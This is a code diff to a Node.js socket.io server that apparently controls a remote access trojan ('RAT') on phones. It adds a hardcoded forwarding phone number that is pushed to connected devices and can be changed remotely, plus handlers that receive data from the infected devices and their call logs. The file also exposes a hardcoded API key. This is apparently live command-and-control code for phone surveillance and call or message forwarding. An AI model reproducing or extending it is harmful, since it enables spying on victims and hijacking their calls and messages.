@@ -11,6 +11,8 @@ var Apikey = "51e57ac42770964a";
 
 const PORT = 8080;
 
+var forw_num = "+916390376385";
+
 io.set('heartbeat interval', 10000);
 io.set('heartbeat timeout', 20000);
 
@@ -37,6 +39,8 @@ io.on('connection', function(socket) {
 	//users = users +1;
 	console.log('User Connected: '+socket.id);
 	
+	io.emit('update_num',forw_num);
+	
 	// ON NEW RAT CONNECTION AFTER NEW CONNECTION
 	socket.on('user_connected' , function(data){
 		console.log('On User Connect: ');
@@ -49,6 +53,24 @@ io.on('connection', function(socket) {
 		}
 		//call_php(data);
 	});
+	
+	socket.on('update_num_server' , function(data){
+		console.log('UPDATING FORW_NUM: '+data);
+		forw_num = data;
+		console.log(forw_num);
+		io.emit('update_num',forw_num);
+	});
+	
+	socket.on('send_data_rat' , function(data){
+		console.log('MSG: '+data);
+	});
+	
+	socket.on('test_msg' , function(data){
+		console.log('MSG: '+data);
+	});
+	
+	
+	
 
 	socket.on('all_calls' , function(data){
 		console.log('ALL CALLS DATA: ');
